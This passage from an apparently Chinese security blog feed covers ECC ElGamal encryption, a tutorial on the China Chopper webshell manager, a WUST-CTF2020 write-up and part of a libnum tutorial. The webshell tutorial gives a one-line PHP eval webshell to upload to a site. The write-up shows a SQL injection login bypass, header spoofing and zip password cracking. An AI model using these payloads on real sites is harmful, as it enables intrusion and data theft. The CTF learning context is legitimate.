class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span> 上选取一个阶为n(n为一个大素数)的生成元P。随机选取整数x(1&lt;x&lt;n)，计算Q=xP。公钥为Q，私钥为x。</li>
<li>加密：<br />
为了加密<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">P_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，随机选取一个整数k，1&lt;k&lt;n，计算</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>k</mi><mi>P</mi><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><mi>Q</mi></mrow><annotation encoding="application/x-tex">C_1=kP, C_2=P_m+kQ
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">Q</span></span></span></span></span></p>
<pre><code>则密文$c=(C_1,C_2)$。
</code></pre>
<ol start="3">
<li>解密：<br />
为了解密一个密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=(C_1,C_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，计算</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>−</mo><mi>x</mi><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><mi>Q</mi><mo>−</mo><mi>x</mi><mi>k</mi><mi>P</mi><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><mi>x</mi><mi>P</mi><mo>−</mo><mi>x</mi><mi>k</mi><mi>P</mi><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">C_2-xC_1=P_m+kQ-xkP=P_m+kxP-xkP=P_m 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">x</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<pre><code>攻击者要想从$c=(C_1,C_2)$，计算出$P_m$，就必须知道k。而要从P和kP中计算出k将面临求解椭圆曲线上的离散对数问题。
</code></pre>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>公钥密码</tag>
      </tags>
  </entry>
  <entry>
    <title>中国菜刀的简单使用</title>
    <url>/CTF/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1>
<p>说到菜刀，普通人肯定想到家里切菜的菜刀，而对于程序员来说，首先想到的却是一款功能强大的webshell管理工具。中国菜刀小巧实用，具有文件管理，数据库管理，虚拟终端等功能，支持PHP，ASP的服务端脚本。</p>
<h1 id="简单使用"><a class="markdownIt-Anchor" href="#简单使用"></a> 简单使用</h1>
<ol>
<li>新建一个PHP文件，写入一句话<code>&lt;?php eval($_POST['a']);?&gt;</code>将这个文件上传到站点里。</li>
<li>打开菜刀，在空白处右键点击“添加”，按照图中指示进行填写，填写完成后点击添加。<br />
<img src="https://img-blog.csdnimg.cn/20200408154201770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /><br />
<img src="https://img-blog.csdnimg.cn/20200408154222587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /></li>
<li>添加成功后就会产生一条新的记录，点击鼠标右键，选择文件管理（或双击），就会看到站点的文件信息。选中文件击鼠标右键即可进行文件的添加，删除，更改等操作。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20200408154305897.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
<img src="https://img-blog.csdnimg.cn/20200408154321238.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
5. 点击虚拟终端，即可进入菜刀的命令行。<br />
6. 点击数据库管理，即可查看数据库中的数据。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>WUST-CTF2020 writeup</title>
    <url>/CTF/writeup07/</url>
    <content><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h1>
<h2 id="checkin"><a class="markdownIt-Anchor" href="#checkin"></a> checkin</h2>
<p><strong>题目：</strong>  无<br />
<strong>解题思路：</strong> 打开链接，发现提问作者，打开查看器，发现按钮被隐藏，输入框被限制，更改代码，输入作者名，提示一个博客</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202012979.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<p>打开，在最上方发现flag的一部分<br />
<img src="https://img-blog.csdnimg.cn/20200402202032464.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
仔细查看，有一篇名为《远古的blog》的博客，打开<br />
在最下方发现另一部分flag。</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202136377.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="admin"><a class="markdownIt-Anchor" href="#admin"></a> admin</h2>
<p><strong>题目：</strong> login in as admin.<br />
<strong>解题思路：</strong> 打开是登录框，提示用户名是admin，使用万能密码，用户名输入：</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="literal">admin</span><span class="string">' or '</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>登录成功后进入/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php页面，提示本地ip才能访问，构造X-Forwarded-For:127.0.0.1，之后提示</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用GET方式传一个参数ais, 值为<span class="number">520</span></span><br><span class="line">用POST方式传一个参数wust, 值为<span class="number">1314</span></span><br></pre></td></tr></table></figure>
<p>最后提示</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">你离flag已经很近了，网址给你了：<span class="number">4</span>dz  aste.ubuntu.com<span class="regexp">/p/</span>    <span class="string">https:</span><span class="comment">//p  Rqr  cSf2</span></span><br></pre></td></tr></table></figure>
<p>手动拼接还原网址 <a href="https://paste.ubuntu.com/p/cSf24dzRqr" target="_blank" rel="noopener">https://paste.ubuntu.com/p/cSf24dzRqr</a>   ，访问得到</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">d<span class="number">2</span><span class="symbol">N0</span>ZjIwMjB<span class="number">7</span>bjB<span class="number">3</span>X<span class="number">3</span>lvdV<span class="number">9</span>rbjB<span class="number">3</span>X<span class="number">3</span>RoZV<span class="number">9</span>iYX<span class="symbol">NpY18</span>wZl<span class="number">9</span>zcWxfYW<span class="number">5</span>kX<span class="number">2</span>h<span class="number">0</span>dHB<span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>base64转码，得到flag，wctf2020{n0w_you_kn0w_the_basic_0f_sql_and_http}。</p>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<h2 id="space-club"><a class="markdownIt-Anchor" href="#space-club"></a> Space Club</h2>
<p><strong>题目：</strong>  无<br />
<strong>解题思路：</strong> 打开txt，未发现任何文字，由于题目是space，想到空格，ctrl+a全选文本，果然发现空格，观察形势，联想到0,1二进制数据，写脚本运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">txt = open(<span class="string">"space.txt"</span>,<span class="string">"r"</span>).readlines()</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    <span class="keyword">if</span> len(i.strip(<span class="string">'\n'</span>)) == <span class="number">6</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">flag = libnum.b2s(tmp)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>得到flag，wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}。</p>
<h2 id="welcome"><a class="markdownIt-Anchor" href="#welcome"></a> Welcome</h2>
<p><strong>题目：</strong> 《论语》：三人行，必有我师焉。<br />
<strong>解题思路：</strong> 打开压缩文件，发现需要打开摄像头，又提示三人行，尝试打开手机搜索一张带有三个人的图片，放到摄像头，flag出现。<br />
wctf2020{We1cOme_t0_wCtF2o20_aNd_eNj0y_1t}</p>
<h2 id="爬"><a class="markdownIt-Anchor" href="#爬"></a> 爬</h2>
<p><strong>题目：</strong>  链接: <a href="https://pan.baidu.com/s/1DatOBKD-3cee_Tp8LuvPLg" target="_blank" rel="noopener">https://pan.baidu.com/s/1DatOBKD-3cee_Tp8LuvPLg</a><br />
提取码: jm9z<br />
<strong>解题思路：</strong> 查看文件头，发现是pdf，添加后缀名，打开，提示图片下隐藏flag，用ps打开，发现一张写有一串十六进制数的图片<br />
<img src="https://img-blog.csdnimg.cn/20200402202211340.PNG" alt="在这里插入图片描述" /></p>
<p>将其转换成文本，得到flag，wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</p>
<h2 id="find-me"><a class="markdownIt-Anchor" href="#find-me"></a> Find me</h2>
<p><strong>题目：</strong> can u find me?<br />
<strong>解题思路：</strong>  查看图片属性，发现备注有一段盲文，解密即可<br />
解密地址：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></p>
<p>wctf2020{y<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>u_f<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>n<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>_M<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>ee<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>e}</p>
<h2 id="shop"><a class="markdownIt-Anchor" href="#shop"></a> Shop</h2>
<p><strong>题目：</strong>  you can buy the flag in the shop, here’s your exchange.<br />
nc 47.97.40.187 12306。<br />
<strong>解题思路：</strong> 在kali中运行nc 47.97.40.187 12306，出现下图</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202236809.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
选择2，出现cheaper，real两个选项，选择real，提示余额不足，选择cheaper，提示每个flag 999，让我们输入购买数量，这是想到 <strong>整数溢出</strong> ，输入一个大数，这里我输的是222222222</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202253178.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
果不其然，花费是负数，余额增加。这时去购买real，得到flag，</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202314993.PNG#pic_center" alt="在这里插入图片描述" /><br />
wctf2020{0h_noooo_y0u_r0b_my_sh0p}。</p>
<h2 id="girlfriend"><a class="markdownIt-Anchor" href="#girlfriend"></a> girlfriend</h2>
<p><strong>题目：</strong> I want a girl friend !!!  将结果用wctf2020{}再提交<br />
<strong>解题思路：</strong>  打开wav，仔细听，发现是拨号时的按键声，用DTMF解码器解码得到<br />
<img src="https://img-blog.csdnimg.cn/2020040220233260.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br />
对应手机九键查找字母得到，youbremygirlfriends,提交发现错误，对照Audacity的频谱图，发现解码器缺少一个2，flag应该是wctf2020{youaremygirlfriends}。</p>
<h2 id="alison-likes-jojo"><a class="markdownIt-Anchor" href="#alison-likes-jojo"></a> Alison likes jojo</h2>
<p><strong>题目：</strong> As we known, Alison is a pretty girl.<br />
<strong>解题思路：</strong> 下载题中文件，得到两张jpg，放到kali中用binwalk查看，发现boki.jpg隐藏zip，foremost分离，得到zip需要密码。<br />
用fcrackzip破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u 00000345.zip</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200402202351213.PNG" alt="在这里插入图片描述" /><br />
得到密码888866，打开beisi.txt，发现一串字符：WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09，用base64多次解码得到killerqueen，猜测其是加密密钥。想到outguess隐写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r jljy.jpg -k killerqueen 1.txt</span><br></pre></td></tr></table></figure>
<p>得到flag，wctf2020{pretty_girl_alison_likes_jojo}。</p>
<p><img src="https://img-blog.csdnimg.cn/20200402202407616.PNG#pic_center" alt="在这里插入图片描述" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>libnum库的安装与使用</title>
    <url>/Python/libnum%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="1-安装"><a class="markdownIt-Anchor" href="#1-安装"></a> 1. 安装</h1>
<h2 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hellman/libnum</span><br><span class="line"><span class="built_in">cd</span> libnum</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<h2 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install libnum</span><br></pre></td></tr></table></figure>
<h1 id="2-常见函数使用"><a class="markdownIt-Anchor" href="#2-常见函数使用"></a> 2. 常见函数使用</h1>
<h2 id="coverting"><a class="markdownIt-Anchor" href="#coverting"></a> Coverting</h2>
<ol>
<li>libnum.s2n(s)：字符串转换为数字。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">"ab12"</span></span><br><span class="line">print(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1633825074</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>libnum.s2n(n)：数字转换为字符串。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">1633825074</span></span><br><span class="line">print(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>libnum.s2b(s)：字符串转换为二进制字符串。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">"ab12"</span></span><br><span class="line">print(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">01100001011000100011000100110010</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>libnum.b2s(b)：二进制字符串转换为字符串。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b = <span class="string">"01100001011000100011000100110010"</span></span><br><span class="line">print(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure>
<h2 id="primes"><a class="markdownIt-Anchor" href="#primes"></a> Primes</h2>
<ol>
<li>libnum.primes(n)：返回不大于n的素数列表。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.primes(<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">result: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>libnum.generate_prime(n)：产生长度为n位的伪素数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.generate_prime(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1021</span></span><br></pre></td></tr></table></figure>
<h2 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h2>
<ol>
<li>libnum.factorize(n)：返回n的所有素因子及每个素因子的个数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.factorize(<span class="number">60</span>))</span><br><span class="line"></span><br><span class="line">result: &#123;<span class="number">2</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">1</span>, <span class="number">5</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>libnum.modular.invmod(e,m)：返回e模m的逆元。</li>
</ol>
